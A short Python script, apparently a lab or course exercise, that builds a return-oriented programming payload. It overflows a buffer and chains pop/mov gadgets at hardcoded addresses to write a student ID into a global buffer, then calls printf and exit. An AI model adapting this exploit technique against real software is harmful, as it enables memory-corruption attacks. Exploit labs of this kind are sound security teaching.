padding = '41414141424242424343434344444444'  # AAAABBBBCCCCDDDD
printf = '00084600'  # address of printf function (little endian)
exit = '50474C00'  # address of exit function (little endian)
string_addr = '38ef5300'  # address of g_buffer (little endian)
string_addr_4 = '3cef5300'  # address of g_buffer+4 (little endian)
string_addr_8 = '40ef5300'  # address of g_buffer+8 (little endian)

g1 = 'A9054600'  # address of gadget 1 - pop eax
g2 = 'AB054600'  # address of gadget 2 - pop ecx
g3 = 'AD054600'  # address of gadget 3 - mov [eax], ecx

id = '212945760'  # my id
id_1 = '32313239'  # ascii value of 2129 in hex
id_2 = '34353736'  # ascii value of 4576 in hex
id_3 = '30000000'  # ascii value of 0 in hex (and 3 null bytes)

payload = padding +         \
    g1 + string_addr +      \
    g2 + id_1 +             \
    g3 +                    \
    g1 + string_addr_4 +    \
    g2 + id_2 +             \
    g3 +                    \
    g1 + string_addr_8 +    \
    g2 + id_3 +             \
    g3 +                    \
    printf +                \
    exit +                  \
    string_addr
    
print(payload)
